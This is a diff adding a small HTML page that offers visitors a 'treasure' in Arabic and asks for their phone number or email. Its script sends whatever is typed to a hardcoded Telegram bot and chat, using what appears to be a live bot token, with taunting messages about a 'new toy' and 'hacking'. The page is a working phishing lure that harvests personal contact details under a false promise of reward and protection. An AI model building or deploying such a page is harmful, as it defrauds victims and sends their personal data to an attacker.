@@ -1,0 +1,92 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8"> </meta>
+			<meta name="viewport" content="width=device-width, initial-scale=1.0"> </meta>
+				<title>Get your booty</title>
+				<!-- Tailwind CSS -->
+				<script src="https://cdn.tailwindcss.com"></script>
+			</head>
+	<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen p-4">
+
+		<div class="bg-gray-800 p-8 rounded-2xl shadow-xl w-full max-w-md border border-gray-700">
+			<h1 class="text-2xl font-bold mb-2 text-center">الرجاء ارسال رقم هاتفك او بريدك الالكتروني</h1>
+			<p class="text-gray-400 text-sm mb-6 text-center">تحت قوانين متجرنا, فانت محمي من التعرض لاى مشكلة</p>
+
+			<form id="telegramForm" class="space-y-4">
+				<div>
+					<textarea
+						id="messageInput"
+						rows="4"
+						required=""
+						placeholder="..."
+						class="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg focus:outline-none focus:border-blue-500 text-white placeholder-gray-500 resize-none transition-colors"
+                ></textarea>
+				</div>
+
+				<button
+					type="submit"
+					id="submitBtn"
+					class="w-full bg-blue-600 hover:bg-blue-500 text-white font-medium py-3 rounded-lg transition duration-200 shadow-lg shadow-blue-600/30 flex items-center justify-center space-x-2"
+            >
+					<span>Redeem الحصول على الكنز</span>
+				</button>
+			</form>
+
+			<div id="statusMessage" class="mt-4 text-center text-sm hidden"></div>
+		</div>
+
+		<script>
+			// CONFIGURATION: Replace these two variables with your Telegram bot details
+			const BOT_TOKEN = '8818543349:AAFbqaKksgm4V1jq4QCph0WWpV0-7ML9cig';
+			const CHAT_ID = '6609393016';
+
+			const form = document.getElementById('telegramForm');
+			const messageInput = document.getElementById('messageInput');
+			const submitBtn = document.getElementById('submitBtn');
+			const statusMessage = document.getElementById('statusMessage');
+
+			form.addEventListener('submit', async function(e) {
+			e.preventDefault();
+
+			const userText = messageInput.value.trim();
+			if (!userText) return;
+
+			submitBtn.disabled = true;
+			submitBtn.textContent = 'جاري القرصنة...';
+
+			const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+			try {
+			const response = await fetch(url, {
+			method: 'POST',
+			headers: {
+			'Content-Type': 'application/json'
+			},
+			body: JSON.stringify({
+			chat_id: CHAT_ID,
+			text: `Mommy got you a new toy:\n\n${userText}`
+			})
+			});
+
+			const data = await response.json();
+
+			if (data.ok) {
+			statusMessage.textContent = 'نجحت العملية';
+			statusMessage.className = 'mt-4 text-center text-sm text-green-400 block';
+			form.reset();
+			} else {
+			throw new Error(data.description || 'try again');
+			}
+			} catch (error) {
+			statusMessage.textContent = `❌ Error: ${error.message}`;
+			statusMessage.className = 'mt-4 text-center text-sm text-red-400 block';
+			} finally {
+			submitBtn.disabled = false;
+			submitBtn.textContent = 'تسجيل الدخول لكي تصبح قرصان مثلنا';
+			}
+			});
+		</script>
+
+	</body>
+</html>
